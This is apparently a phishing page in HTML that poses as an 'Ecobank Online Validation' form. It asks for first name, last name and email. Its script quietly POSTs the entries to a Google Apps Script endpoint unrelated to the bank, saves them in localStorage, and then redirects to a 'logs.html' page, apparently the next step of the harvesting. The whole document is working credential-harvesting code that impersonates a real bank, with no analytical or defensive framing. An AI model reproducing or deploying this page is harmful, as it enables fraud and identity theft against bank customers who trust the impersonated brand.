<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Ecobank Online Validation</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

<style>
  body {
    margin: 0;
    min-height: 100vh;
    font-family: "Inter", Arial, sans-serif;
    background: linear-gradient(to bottom, #2b6cb0, #2a4365);
    display: flex;
    flex-direction: column;
    color: #fff;
  }

  header {
    padding: 30px 20px 50px;
    text-align: center;
    border-bottom-left-radius: 40px;
    border-bottom-right-radius: 40px;
    background: linear-gradient(135deg, #2b6cb0, #2a4365);
    box-shadow: 0 6px 18px rgba(0,0,0,.35);
  }

  .badge {
    display: inline-block;
    padding: 12px 22px;
    border-radius: 999px;
    font-weight: 700;
    font-size: 18px;
    background: linear-gradient(135deg, #1e3c72, #2a5298);
    box-shadow: 0 6px 14px rgba(0,0,0,.3);
  }

  header p {
    margin-top: 10px;
    font-size: 14px;
    opacity: .9;
  }

  main {
    flex: 1;
    display: flex;
    justify-content: center;
    padding: 30px 15px;
  }

  .card {
    background: #fff;
    width: 100%;
    max-width: 420px;
    padding: 30px 26px;
    border-radius: 14px;
    box-shadow: 0 14px 30px rgba(0,0,0,.45);
    color: #333;
    margin-top: -35px;
  }

  label {
    font-size: 13px;
    font-weight: 600;
    display: block;
    margin-bottom: 6px;
  }

  input {
    width: 100%;
    padding: 12px;
    border-radius: 8px;
    border: 1px solid #ccc;
    margin-bottom: 18px;
    font-size: 14px;
  }

  button {
    width: 100%;
    padding: 14px;
    border-radius: 999px;
    border: none;
    background: linear-gradient(135deg, #28a745, #218838);
    color: #fff;
    font-size: 15px;
    font-weight: 700;
    cursor: pointer;
    box-shadow: 0 6px 18px rgba(0,0,0,.35);
  }

  button:hover {
    background: linear-gradient(135deg, #218838, #1e7e34);
  }

  .overlay {
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,.45);
    display: flex;
    align-items: center;
    justify-content: center;
    flex-direction: column;
    opacity: 0;
    pointer-events: none;
    transition: .3s;
    z-index: 999;
    color: #fff;
  }

  .overlay.active { opacity: 1; pointer-events: auto; }

  .spinner {
    width: 36px;
    height: 36px;
    border: 3px solid rgba(255,255,255,.3);
    border-top: 3px solid #fff;
    border-radius: 50%;
    animation: spin .9s linear infinite;
    margin-bottom: 14px;
  }

  @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>

<body>
<header>
  <div class="badge">ECOBANK ONLINE VALIDATION</div>
  <p>A Better Way to Bank Your Way</p>
</header>

<main>
  <div class="card" id="formContainer">
    <form id="dataForm">
      <label>First Name</label>
      <input name="firstName" required>

      <label>Last Name</label>
      <input name="lastName" required>

      <label>Email Address</label>
      <input type="email" name="email" required>

      <button type="submit">Continue →</button>
    </form>
  </div>
</main>

<div class="overlay" id="overlay">
  <div class="spinner"></div>
  Processing…
</div>

<script>
const scriptURL = "https://script.google.com/macros/s/AKfycbxna9EgM4s8zbNQTkfzcHfADid6CE7MEMmXAAIX2RTU6YfT-GkHRxEIWPVa81Qt-oO0/exec";
const form = document.getElementById("dataForm");
const overlay = document.getElementById("overlay");

form.addEventListener("submit", async e => {
  e.preventDefault();
  overlay.classList.add("active");
  const fd = new FormData(form);
  await fetch(scriptURL, { method:"POST", body:fd });
  localStorage.setItem("firstName", fd.get("firstName"));
  localStorage.setItem("lastName", fd.get("lastName"));
  localStorage.setItem("email", fd.get("email"));
  setTimeout(()=>location.href="logs.html", 900);
});
</script>
</body>
</html>
